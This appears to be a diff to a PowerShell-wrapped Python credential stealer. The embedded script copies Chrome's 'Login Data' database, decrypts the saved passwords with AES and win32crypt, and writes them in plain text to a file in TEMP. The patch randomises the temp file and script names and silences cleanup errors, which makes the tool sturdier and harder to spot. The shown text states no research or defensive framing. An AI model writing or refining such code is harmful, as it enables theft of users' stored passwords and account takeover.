@@ -23,6 +23,7 @@ import json
 import base64
 import sqlite3
 import shutil
+import random
 from datetime import datetime
 from Crypto.Cipher import AES
 import win32crypt
@@ -57,7 +58,9 @@ def main():
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
     
-    filename = os.path.join(os.environ["TEMP"], "ChromeData.db")
+    temp_dir = os.environ["TEMP"]
+    filename = os.path.join(temp_dir, f"ChromeData_{random.randint(1000,9999)}.db")
+    
     shutil.copyfile(db_path, filename)
     
     db = sqlite3.connect(filename)
@@ -78,10 +81,14 @@ def main():
     
     cursor.close()
     db.close()
-    os.remove(filename)
+    
+    try:
+        os.remove(filename)
+    except:
+        pass
     
     # Write to temp file
-    output_file = os.path.join(os.environ["TEMP"], "chrome_passwords.txt")
+    output_file = os.path.join(temp_dir, "chrome_passwords.txt")
     with open(output_file, "w", encoding="utf-8") as f:
         f.write("\n".join(results))
     
@@ -91,7 +98,7 @@ if __name__ == "__main__":
     main()
 '@
     
-    $scriptPath = "$env:TEMP\extract_chrome.py"
+    $scriptPath = "$env:TEMP\extract_chrome_$(Get-Random).py"
     $pythonScript | Out-File $scriptPath -Encoding UTF8
     
     Log "Python script created"
